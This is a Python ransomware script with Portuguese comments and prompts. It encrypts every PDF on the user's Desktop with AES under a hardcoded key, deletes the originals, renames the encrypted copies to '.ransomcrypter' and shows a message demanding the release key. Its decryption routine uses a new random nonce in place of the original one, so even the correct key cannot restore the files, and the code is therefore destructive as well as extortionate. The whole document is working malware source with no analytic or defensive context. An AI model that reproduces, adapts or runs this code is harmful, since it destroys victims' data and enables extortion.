import os
import glob
import time
from pathlib import Path
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

lst_arq = ["*.pdf"]

print('Criptografando')
time.sleep(3)

# Entra no Desktop e faz a verificação
try:
    desktop = Path.home() / "Desktop"
    # download = Path.home() / "Downloads"
except Exception as e:
    print("Erro ao definir os diretórios:", e)
    raise SystemExit(1)


def criptografando():
    for file_pattern in lst_arq:
        for file_path in glob.glob(str(desktop / file_pattern)):
            print(file_path)
            with open(file_path, 'rb') as f:
                file_data = f.read()

            os.remove(file_path)

            key = b"1ab2c3e4f5g6h7i8"  # Chave de 16 bytes
            cipher = Cipher(algorithms.AES(key), modes.CTR(os.urandom(16)), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted_data = encryptor.update(file_data) + encryptor.finalize()

            # Salvando o novo arquivo (.ransomcrypter)
            new_file_path = file_path + ".ransomcrypter"
            with open(new_file_path, 'wb') as new_file:
                new_file.write(encrypted_data)


def descrypt(key):
    try:
        for file_path in glob.glob(str(desktop / '*.ransomcrypter')):
            with open(file_path, 'rb') as file:
                file_data = file.read()

            os.remove(file_path)

            cipher = Cipher(algorithms.AES(key), modes.CTR(os.urandom(16)), backend=default_backend())
            decryptor = cipher.decryptor()
            decrypted_data = decryptor.update(file_data) + decryptor.finalize()

            new_file_path = file_path.replace('.ransomcrypter', '')  # Caminho para soltar o arquivo
            with open(new_file_path, 'wb') as new_file:
                new_file.write(decrypted_data)
    except ValueError as err:
        print('Chave inválida')


def main():
    criptografando()
    key = input('Seu PC foi criptografado. Informe a chave para liberar os arquivos:')
    if key == '1ab2c3e4f5g6h7i8':
        descrypt(key)
        for file_path in glob.glob(str(desktop / '*.ransomcrypter')):
            os.remove(file_path)
    else:
        print('Chave de liberação inválida!!!')
        return


if __name__ == '__main__':
    main()
